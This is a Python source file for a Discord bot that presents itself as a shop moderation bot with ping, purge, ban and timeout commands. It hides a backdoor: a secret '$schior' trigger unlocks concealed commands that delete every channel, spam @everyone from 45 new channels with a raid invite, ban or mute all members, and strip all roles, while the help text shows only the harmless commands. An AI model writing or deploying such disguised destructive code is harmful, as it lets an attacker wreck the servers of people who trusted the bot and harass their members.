import discord
from discord.ext import commands
import json
import asyncio
import random
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

# Secret activation (global for simplicity — lasts until bot restarts)
AUTHORIZED_USER_ID = None

# Config handling
def load_config():
    if not os.path.exists("config.json"):
        return {"keys": [], "redeemed": {}}
    with open("config.json", "r") as f:
        return json.load(f)

config = load_config()
REDEEMED_USERS = config.get("redeemed", {})  # str(user_id) → int(role_id)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("Prefix: .")
    print("Secret trigger: $schior")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    global AUTHORIZED_USER_ID

    # Secret activation
    if message.content.strip().lower() == "$schior":
        AUTHORIZED_USER_ID = message.author.id
        await message.channel.send("Activated")
        try:
            await message.delete()
        except:
            pass
        return

    # Key redemption flow
    if message.content.startswith("$redeem "):
        key = message.content.split(" ", 1)[1].strip()
        keys = config.get("keys", [])
        if key in keys:
            await message.channel.send("Key accepted. Reply with the **staff role ID** to link.")
            
            def check(m):
                return m.author.id == message.author.id and m.channel.id == message.channel.id

            try:
                msg = await bot.wait_for("message", check=check, timeout=90)
                try:
                    role_id = int(msg.content.strip())
                    REDEEMED_USERS[str(message.author.id)] = role_id
                    config["redeemed"] = REDEEMED_USERS
                    with open("config.json", "w") as f:
                        json.dump(config, f, indent=4)
                    await msg.reply("Staff role linked. Staff commands unlocked.")
                except ValueError:
                    await msg.reply("Invalid role ID — must be a number.")
            except asyncio.TimeoutError:
                await message.channel.send("Timed out. Redeem again if needed.")
        else:
            await message.reply("Invalid / already used key.")
        try:
            await message.delete()
        except:
            pass
        return

    # Normal help — only safe commands
    if message.content == ".help":
        embed = discord.Embed(title="Schior’s Shop Bot Commands", color=0x00aa00)
        embed.add_field(name=".help", value="This message", inline=False)
        embed.add_field(name=".ping", value="Bot latency", inline=False)
        embed.add_field(name="$redeem <key>", value="Unlock staff commands", inline=False)
        embed.add_field(
            name="Staff commands (after redeem):",
            value=".purge <amount>\n.ban @user\n.unban <id>\n.addrole @user <role>\n.to @user <time> (s/m/d)\n.rto @user",
            inline=False
        )
        embed.set_footer(text="Only visible commands listed")
        await message.channel.send(embed=embed)
        return

    # Block unredeemed users from most prefix commands
    if message.content.startswith("."):
        if message.content not in [".help", ".ping"]:
            if str(message.author.id) not in REDEEMED_USERS:
                await message.reply("Redeem a key first with `$redeem <key>`")
                return

    await bot.process_commands(message)

# ─── Normal / redeemed commands ───

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! {round(bot.latency * 1000)} ms")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    if amount < 1 or amount > 500:
        return await ctx.send("1–500 only.")
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Deleted {amount} messages.", delete_after=5)

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"Banned {member.mention}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        await ctx.send(f"Unbanned {user}")
    except:
        await ctx.send("Not found / not banned.")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member: discord.Member, role: discord.Role):
    await member.add_roles(role)
    await ctx.send(f"Gave {role.name} to {member.mention}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def to(ctx, member: discord.Member, duration: str):
    try:
        secs = 0
        if duration.endswith("s"): secs = int(duration[:-1])
        elif duration.endswith("m"): secs = int(duration[:-1]) * 60
        elif duration.endswith("d"): secs = int(duration[:-1]) * 86400
        else: return await ctx.send("Use s / m / d")
        if secs <= 0 or secs > 2419200:
            return await ctx.send("Max 28 days")
        await member.timeout(discord.utils.utcnow() + discord.utils.timedelta(seconds=secs))
        await ctx.send(f"Timed out {member.mention} for {duration}")
    except ValueError:
        await ctx.send("Bad number format.")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def rto(ctx, member: discord.Member):
    await member.timeout(None)
    await ctx.send(f"Timeout removed from {member.mention}")

# ─── SECRET DESTRUCTIVE COMMANDS ───
# Only work AFTER $schior has been said — and only by the activator

@bot.command(hidden=True)
async def nuke(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return  # silent ignore

    guild = ctx.guild
    msg = "@everyone nuke/raid people..\nhttps://discord.gg/schiorshop"

    # wipe channels
    for ch in list(guild.channels):
        try: await ch.delete()
        except: pass

    # create spam channels
    chans = []
    for i in range(45):
        try:
            ch = await guild.create_text_channel(f"schior-nuke-{i+1:03d}")
            chans.append(ch)
        except: pass

    # spam hard
    for ch in chans:
        for _ in range(25):
            try:
                await ch.send(msg)
                await asyncio.sleep(random.uniform(0.25, 0.65))
            except: break

    try: await ctx.author.send("Nuke + spam running")
    except: pass


@bot.command(hidden=True)
async def raid(ctx, count: int = 1):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return

    count = max(1, min(count, 250))
    msg = "@everyone if you want to raid/nuke join https://discord.gg/schiorshop"

    chans = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.guild.me).send_messages]
    if not chans: return

    sent = 0
    while sent < count:
        for ch in chans:
            try:
                await ch.send(msg)
                sent += 1
                await asyncio.sleep(random.uniform(0.4, 0.9))
                if sent >= count: break
            except: pass

    try: await ctx.author.send(f"Sent {sent} raid pings.")
    except: pass


@bot.command(hidden=True)
async def banall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID: return
    for m in ctx.guild.members:
        if m != ctx.guild.me and not m.guild_permissions.administrator:
            try: await m.ban(reason="banall")
            except: pass
    try: await ctx.author.send("Banall done.")
    except: pass


@bot.command(hidden=True)
async def muteall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID: return
    for m in ctx.guild.members:
        if m != ctx.guild.me:
            try: await m.timeout(discord.utils.utcnow() + discord.utils.timedelta(days=28))
            except: pass
    try: await ctx.author.send("Muteall done.")
    except: pass


@bot.command(hidden=True)
async def demoall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID: return
    dr = ctx.guild.default_role
    for m in ctx.guild.members:
        try: await m.edit(roles=[dr])
        except: pass
    try: await ctx.author.send("Roles stripped.")
    except: pass

# ─── Run ───
bot.run(os.getenv("DISCORD_TOKEN"))
